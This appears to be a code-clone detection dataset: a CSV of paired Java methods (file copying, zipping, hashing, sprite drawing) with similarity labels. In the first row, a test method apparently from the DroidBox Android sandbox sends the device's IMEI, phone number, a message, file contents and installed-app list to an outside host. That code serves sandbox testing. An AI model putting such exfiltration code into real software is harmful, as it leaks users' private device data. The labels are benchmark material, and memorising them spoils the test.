code1,code2,label
"    public void testNetworkHTTP() {
        Log.v(""Test"", ""[*] testNetworkHTTP()"");
        URL url = null;
        HttpURLConnection urlConnection = null;
        try {
            url = new URL(""http://code.google.com/p/droidbox/"");
            urlConnection = (HttpURLConnection) url.openConnection();
            BufferedReader rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            @SuppressWarnings(""unused"") String line = """";
            while ((line = rd.readLine()) != null) ;
            url = new URL(""http://pjlantz.com/imei.php?imei="" + hashedImei);
            urlConnection = (HttpURLConnection) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while ((line = rd.readLine()) != null) ;
            url = new URL(""http://pjlantz.com/phone.php?phone="" + phoneNbr);
            urlConnection = (HttpURLConnection) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while ((line = rd.readLine()) != null) ;
            url = new URL(""http://pjlantz.com/msg.php?msg="" + msg.replace("" "", ""+""));
            urlConnection = (HttpURLConnection) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            url = new URL(""http://pjlantz.com/file.php?file="" + fileContent.replace("" "", ""+""));
            urlConnection = (HttpURLConnection) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while ((line = rd.readLine()) != null) ;
            url = new URL(""http://pjlantz.com/app.php?installed="" + installedApps.replace("" "", ""+""));
            urlConnection = (HttpURLConnection) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while ((line = rd.readLine()) != null) ;
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            urlConnection.disconnect();
        }
    }
","    private List parseUrlGetUids(String url) throws FetchError {
        List hids = new ArrayList();
        try {
            InputStream is = (new URL(url)).openStream();
            BufferedReader in = new BufferedReader(new InputStreamReader(is));
            StringBuffer buffer = new StringBuffer();
            String inputLine = """";
            Pattern pattern = Pattern.compile(""\\<input\\s+type=hidden\\s+name=hid\\s+value=(\\d+)\\s?\\>"", Pattern.CASE_INSENSITIVE);
            while ((inputLine = in.readLine()) != null) {
                Matcher matcher = pattern.matcher(inputLine);
                if (matcher.find()) {
                    String id = matcher.group(1);
                    if (!hids.contains(id)) {
                        hids.add(id);
                    }
                }
            }
        } catch (Exception e) {
            System.out.println(e);
            throw new FetchError(e);
        }
        return hids;
    }
",1
"        public void handler(osd_bitmap bitmap) {
            int offs;
            for (offs = videoram_size[0] - 1; offs >= 0; offs--) {
                if (dirtybuffer[offs] != 0) {
                    int sx, sy;
                    dirtybuffer[offs] = 0;
                    sx = (offs / 32);
                    sy = (31 - offs % 32);
                    drawgfx(tmpbitmap, Machine.gfx[0], (videoram.read(offs) & 0x3f) + 0x40, 0, 0, 0, 8 * (sx + 1), 8 * sy, Machine.drv.visible_area, TRANSPARENCY_NONE, 0);
                }
            }
            copybitmap(bitmap, tmpbitmap, 0, 0, 0, 0, Machine.drv.visible_area, TRANSPARENCY_NONE, 0);
            for (offs = 0; offs < 0x10; offs++) {
                if (spriteram.read(offs + 0x20) < 0xf8) {
                    int spritenum, color;
                    spritenum = spriteram.read(offs) & 0x3f;
                    if ((spritenum & 1) != 0) spritenum = spritenum / 2 + 64; else spritenum = spritenum / 2;
                    color = spriteram.read(offs + 0x30);
                    Machine.gfx[1].colortable.write(3, Machine.pens[15 - centiped_spritepalette.read((color >> 4) & 3)]);
                    Machine.gfx[1].colortable.write(2, Machine.pens[15 - centiped_spritepalette.read((color >> 2) & 3)]);
                    Machine.gfx[1].colortable.write(1, Machine.pens[15 - centiped_spritepalette.read((color >> 0) & 3)]);
                    drawgfx(bitmap, Machine.gfx[1], spritenum, 0, spriteram.read(offs) & 0x80, 0, 248 - spriteram.read(offs + 0x10), 248 - spriteram.read(offs + 0x20), Machine.drv.visible_area, TRANSPARENCY_PEN, 0);
                }
            }
        }
","	public static void copyFile5(File srcFile, File destFile) throws IOException {
		InputStream in = new FileInputStream(srcFile);
		OutputStream out = new FileOutputStream(destFile);
		IOUtils.copyLarge(in, out);
		in.close();
		out.close();
	}
",0
"    public synchronized void processOutput() {
        LogUtil.entering(log);
        while ((hasOutput()) && getChannel().isOpen()) {
            if (!hasOutBuffer()) {
                String nextLine = (String) outLines.removeFirst();
                byte[] outBytes = nextLine.getBytes();
                outBuffer = ByteBuffer.wrap(outBytes);
                setHasOutBuffer(true);
            }
            ByteBuffer buf = outBuffer;
            try {
                int nbytes = getChannel().write(buf);
                addSentBytesNum(nbytes);
                if (buf.remaining() == 0) {
                    setHasOutBuffer(false);
                    outBuffer = null;
                } else {
                    break;
                }
            } catch (IOException e) {
                System.out.println(""Error sending...: "" + e.getMessage());
                try {
                    getChannel().close();
                } catch (IOException e2) {
                }
                doClose = true;
            }
        }
        if (hasOutput()) {
            selectionKey.interestOps(SelectionKey.OP_WRITE);
        } else {
            selectionKey.interestOps(SelectionKey.OP_READ);
        }
    }
","	public static void copyFile2(File srcFile, File destFile) throws IOException {
		FileUtils.copyFile(srcFile, destFile);
	}
",0
"    public void createZip(File zipFileName, Vector<File> selected) {
        try {
            byte[] buffer = new byte[4096];
            ZipOutputStream out = new ZipOutputStream(new BufferedOutputStream(new FileOutputStream(zipFileName), 8096));
            out.setLevel(Deflater.BEST_COMPRESSION);
            out.setMethod(ZipOutputStream.DEFLATED);
            for (int i = 0; i < selected.size(); i++) {
                FileInputStream in = new FileInputStream(selected.get(i));
                String file = selected.get(i).getPath();
                if (file.indexOf(""\\"") != -1) file = file.substring(file.lastIndexOf(Options.fs) + 1, file.length());
                ZipEntry ze = new ZipEntry(file);
                out.putNextEntry(ze);
                int len;
                while ((len = in.read(buffer)) > 0) out.write(buffer, 0, len);
                out.closeEntry();
                in.close();
                selected.get(i).delete();
            }
            out.close();
        } catch (IllegalArgumentException iae) {
            iae.printStackTrace();
        } catch (FileNotFoundException fnfe) {
            fnfe.printStackTrace();
        } catch (IOException ioe) {
            ioe.printStackTrace();
        }
    }
","    private static void recZip(ZipOutputStream zos, File zipBaseDir, String relPath) throws IOException {
        File f = new File(zipBaseDir, relPath);
        if (f.exists()) {
            if (f.isDirectory()) {
                String[] flist = f.list();
                for (int i = 0; i < flist.length; i++) {
                    String childRelPath = relPath.length() > 0 ? relPath + File.separator + flist[i] : flist[i];
                    recZip(zos, zipBaseDir, childRelPath);
                }
            } else {
                InputStream in = new BufferedInputStream(new FileInputStream(f));
                zos.putNextEntry(new ZipEntry(relPath));
                int len;
                byte[] buf = new byte[1024];
                while ((len = in.read(buf)) > 0) {
                    zos.write(buf, 0, len);
                }
                zos.closeEntry();
                in.close();
            }
        }
    }
",1
"    public void createNewFile(String filePath, InputStream in) throws IOException {
        FileOutputStream out = null;
        try {
            File file = newFileRef(filePath);
            FileHelper.createNewFile(file, true);
            out = new FileOutputStream(file);
            IOUtils.copy(in, out);
        } finally {
            IOUtils.closeQuietly(in);
            IOUtils.closeQuietly(out);
        }
    }
","        public void writeFile(OutputStream outputStream) throws IOException {
            InputStream inputStream = null;
            if (file != null) {
                try {
                    inputStream = new FileInputStream(file);
                    IOUtils.copy(inputStream, outputStream);
                } finally {
                    if (inputStream != null) {
                        IOUtils.closeQuietly(inputStream);
                    }
                }
            }
        }
",1
"    private static void zip(Logger logger, File[] files, ZipOutputStream zos) throws IOException {
        byte[] buf = new byte[1024];
        try {
            for (int i = 0; i < files.length; i++) {
                File f = files[i];
                if (f.isDirectory()) {
                    if (relative) {
                        logger.debug(""New dir entry: "" + f.getAbsolutePath().substring(relativeDir.length() + 1, f.getAbsolutePath().length()) + NIX_FILEPATH_SEP);
                        zos.putNextEntry(new ZipEntry(f.getAbsolutePath().substring(relativeDir.length() + 1, f.getAbsolutePath().length()) + NIX_FILEPATH_SEP));
                    } else {
                        logger.debug(""New dir entry: "" + f.getAbsolutePath() + NIX_FILEPATH_SEP);
                        zos.putNextEntry(new ZipEntry(f.getAbsolutePath() + NIX_FILEPATH_SEP));
                    }
                    File[] dirList = f.listFiles();
                    zip(logger, dirList, zos);
                    continue;
                }
                FileInputStream in = new FileInputStream(f.getAbsolutePath());
                if (relative) {
                    logger.debug(""New file entry: "" + f.getAbsolutePath().substring(relativeDir.length(), f.getAbsolutePath().length()));
                    zos.putNextEntry(new ZipEntry(f.getAbsolutePath().substring(relativeDir.length(), f.getAbsolutePath().length())));
                } else {
                    logger.debug(f.getAbsolutePath());
                    zos.putNextEntry(new ZipEntry(f.getAbsolutePath()));
                }
                int len;
                while ((len = in.read(buf)) > 0) {
                    zos.write(buf, 0, len);
                }
                in.close();
                zos.closeEntry();
            }
        } catch (IOException e) {
            logger.error(""IO Error: "" + e.getMessage());
            e.printStackTrace();
            throw e;
        }
    }
","    public void outputEntry(ZipOutputStream zos, File f, boolean isRecursive) throws Error, IOException {
        String adjustedPath = f.getPath().replace(File.separatorChar, '/');
        if (f.isDirectory() && !adjustedPath.endsWith(""/"")) {
            adjustedPath += '/';
        }
        String fileName = f.getName();
        ZipEntry entry = new ZipEntry(fileName);
        entry.setTime(f.lastModified());
        zos.putNextEntry(entry);
        if (f.isDirectory()) {
            if (isRecursive) {
                String[] files = f.list();
                for (int i = 0; i < files.length; ++i) {
                    outputEntry(zos, new File(f, files[i]), isRecursive);
                }
            }
        } else {
            FileInputStream fis = new FileInputStream(f);
            byte buf[] = new byte[1024];
            for (int cnt; (cnt = fis.read(buf)) != -1; ) {
                zos.write(buf, 0, cnt);
            }
            fis.close();
        }
    }
",1
"    @Override
    protected FileRegion createMessage(byte[] data) throws IOException {
        File file = File.createTempFile(""mina"", ""unittest"");
        file.deleteOnExit();
        FileChannel channel = new RandomAccessFile(file, ""rw"").getChannel();
        ByteBuffer buffer = ByteBuffer.wrap(data);
        channel.write(buffer);
        return new DefaultFileRegion(channel);
    }
","	public static void copyFile2(File srcFile, File destFile) throws IOException {
		FileUtils.copyFile(srcFile, destFile);
	}
",0
"    public static void copy(String from_name, String to_name) throws IOException {
        File from_file = new File(from_name);
        File to_file = new File(to_name);
        if (!from_file.exists()) abort(""FileCopy: no such source file: "" + from_name);
        if (!from_file.isFile()) abort(""FileCopy: can't copy directory: "" + from_name);
        if (!from_file.canRead()) abort(""FileCopy: source file is unreadable: "" + from_name);
        if (to_file.isDirectory()) to_file = new File(to_file, from_file.getName());
        if (to_file.exists()) {
            if (!to_file.canWrite()) abort(""FileCopy: destination file is unwriteable: "" + to_name);
        } else {
            String parent = to_file.getParent();
            if (parent == null) parent = System.getProperty(""user.dir"");
            File dir = new File(parent);
            if (!dir.exists()) abort(""FileCopy: destination directory doesn't exist: "" + parent);
            if (dir.isFile()) abort(""FileCopy: destination is not a directory: "" + parent);
            if (!dir.canWrite()) abort(""FileCopy: destination directory is unwriteable: "" + parent);
        }
        FileInputStream from = null;
        FileOutputStream to = null;
        try {
            from = new FileInputStream(from_file);
            to = new FileOutputStream(to_file);
            byte[] buffer = new byte[4096];
            int bytes_read;
            while ((bytes_read = from.read(buffer)) != -1) {
                to.write(buffer, 0, bytes_read);
            }
        } finally {
            if (from != null) {
                try {
                    from.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (to != null) {
                try {
                    to.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }
","    public static void fileCopy(String from_name, String to_name) throws IOException {
        File fromFile = new File(from_name);
        File toFile = new File(to_name);
        if (fromFile.equals(toFile)) abort(""cannot copy on itself: "" + from_name);
        if (!fromFile.exists()) abort(""no such currentSourcepartName file: "" + from_name);
        if (!fromFile.isFile()) abort(""can't copy directory: "" + from_name);
        if (!fromFile.canRead()) abort(""currentSourcepartName file is unreadable: "" + from_name);
        if (toFile.isDirectory()) toFile = new File(toFile, fromFile.getName());
        if (toFile.exists()) {
            if (!toFile.canWrite()) abort(""destination file is unwriteable: "" + to_name);
        } else {
            String parent = toFile.getParent();
            if (parent == null) abort(""destination directory doesn't exist: "" + parent);
            File dir = new File(parent);
            if (!dir.exists()) abort(""destination directory doesn't exist: "" + parent);
            if (dir.isFile()) abort(""destination is not a directory: "" + parent);
            if (!dir.canWrite()) abort(""destination directory is unwriteable: "" + parent);
        }
        FileInputStream from = null;
        FileOutputStream to = null;
        try {
            from = new FileInputStream(fromFile);
            to = new FileOutputStream(toFile);
            byte[] buffer = new byte[4096];
            int bytes_read;
            while ((bytes_read = from.read(buffer)) != -1) to.write(buffer, 0, bytes_read);
        } finally {
            if (from != null) try {
                from.close();
            } catch (IOException e) {
                ;
            }
            if (to != null) try {
                to.close();
            } catch (IOException e) {
                ;
            }
        }
    }
",1
"    private static void copyFile(File src, File dst) throws IOException {
        FileChannel in = new FileInputStream(src).getChannel();
        FileChannel out = new FileOutputStream(dst).getChannel();
        in.transferTo(0, in.size(), out);
        in.close();
        out.close();
    }
","    private static void copy(File src, File dst) {
        try {
            FileChannel srcChannel = new FileInputStream(src).getChannel();
            FileChannel dstChannel = new FileOutputStream(dst).getChannel();
            dstChannel.transferFrom(srcChannel, 0, srcChannel.size());
            srcChannel.close();
            dstChannel.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
",1
"    protected String encrypt(String text) {
        MessageDigest md = null;
        try {
            md = MessageDigest.getInstance(""SHA"");
            md.update(text.getBytes(""UTF-8""));
            byte raw[] = md.digest();
            String hash = (new BASE64Encoder()).encode(raw);
            return hash;
        } catch (Exception ex) {
            throw new TiiraException(ex);
        }
    }
","    public String encrypt(String plaintext) throws Exception {
        MessageDigest md = null;
        try {
            md = MessageDigest.getInstance(""SHA"");
        } catch (NoSuchAlgorithmException e) {
            throw new Exception(e.getMessage());
        }
        try {
            md.update(plaintext.getBytes(""UTF-8""));
        } catch (UnsupportedEncodingException e) {
            throw new Exception(e.getMessage());
        }
        byte raw[] = md.digest();
        String hash = (new BASE64Encoder()).encode(raw);
        return hash;
    }
",1
